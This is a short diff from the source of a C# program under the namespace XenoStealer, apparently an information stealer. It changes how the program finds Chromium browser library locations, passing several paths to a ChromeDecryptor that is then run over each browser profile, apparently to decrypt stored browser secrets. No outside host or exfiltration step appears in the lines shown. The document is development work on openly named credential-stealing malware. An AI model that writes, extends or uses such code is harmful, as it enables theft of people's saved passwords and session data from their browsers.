@@ -37,13 +37,13 @@ namespace XenoStealer
 
                 string browserName = browserInfo.Key;
                 string browserProfilesPath = browserInfo.Value;
-                string browserLibraryPath = Configuration.ChromiumBrowsersLikelyLocations[browserName];
+                string[] browserLibraryPaths = Configuration.ChromiumBrowsersLikelyLocations[browserName];
                 if (!Directory.Exists(browserProfilesPath))
                 {
                     continue;
                 }
 
-                ChromeDecryptor decryptor = new ChromeDecryptor(browserProfilesPath, browserLibraryPath);
+                ChromeDecryptor decryptor = new ChromeDecryptor(browserProfilesPath, browserLibraryPaths);
                 bool canDecrypt = decryptor.operational;
 
                 foreach (string profile in GetProfiles(browserProfilesPath)) 
